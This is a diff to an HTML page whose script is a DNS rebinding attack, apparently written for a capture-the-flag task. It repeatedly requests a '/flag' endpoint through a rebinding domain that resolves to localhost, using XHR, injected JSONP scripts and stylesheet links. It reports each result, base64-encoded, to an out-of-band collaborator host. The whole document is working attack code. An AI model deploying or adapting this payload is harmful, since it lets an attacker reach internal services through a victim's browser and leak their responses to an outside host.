@@ -1,41 +1,59 @@
 <!DOCTYPE html>
 <html>
-    <head>UPDATED</head>
 <body>
 <script>
 const targetDomain = 'acd918ee.7f000001.rbndr.us';
 
-for (let i = 1; i <= 30; i++) {
+for (let i = 1; i <= 50; i++) {
     setTimeout(() => {
-        fetch(`http://${targetDomain}/flag`, { 
-            mode: 'no-cors',
-            credentials: 'omit'
-        })
-        .then(() => {
-            const data = `Request ${i} completed (no-cors)`;
-            const encoded = btoa(data);
-            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?nocors_${i}=${encoded}`;
-        })
-        .catch(err => {
-            const encoded = btoa(err.toString());
-            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error_${i}=${encoded}`;
-        });
-    }, i * 500);
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', `http://${targetDomain}/flag?attempt=${i}`, true);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                const data = `XHR ${i} - Status: ${xhr.status}, State: ${xhr.readyState}`;
+                const encoded = btoa(data);
+                new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?xhr_${i}=${encoded}`;
+            }
+        };
+        xhr.onerror = function() {
+            const encoded = btoa(`XHR ${i} error`);
+            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?xhr_error_${i}=${encoded}`;
+        };
+        xhr.send();
+    }, i * 300);
 }
 
-for (let i = 1; i <= 30; i++) {
+for (let i = 1; i <= 50; i++) {
     setTimeout(() => {
-        const img = new Image();
-        img.onload = () => {
-            const encoded = btoa(`Image ${i} loaded`);
-            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?img_loaded_${i}=${encoded}`;
+        const script = document.createElement('script');
+        script.src = `http://${targetDomain}/flag?jsonp=${i}&callback=leak${i}`;
+        script.onload = () => {
+            const encoded = btoa(`Script ${i} loaded`);
+            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?script_loaded_${i}=${encoded}`;
         };
-        img.onerror = () => {
-            const encoded = btoa(`Image ${i} failed`);
-            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?img_failed_${i}=${encoded}`;
+        script.onerror = () => {
+            const encoded = btoa(`Script ${i} failed`);
+            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?script_failed_${i}=${encoded}`;
         };
-        img.src = `http://${targetDomain}/flag?attempt=${i}`;
-    }, i * 500);
+        document.head.appendChild(script);
+    }, i * 300);
+}
+
+for (let i = 1; i <= 50; i++) {
+    setTimeout(() => {
+        const link = document.createElement('link');
+        link.rel = 'stylesheet';
+        link.href = `http://${targetDomain}/flag?css=${i}`;
+        link.onload = () => {
+            const encoded = btoa(`CSS ${i} loaded`);
+            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?css_loaded_${i}=${encoded}`;
+        };
+        link.onerror = () => {
+            const encoded = btoa(`CSS ${i} failed`);
+            new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?css_failed_${i}=${encoded}`;
+        };
+        document.head.appendChild(link);
+    }, i * 300);
 }
 </script>
 </body>
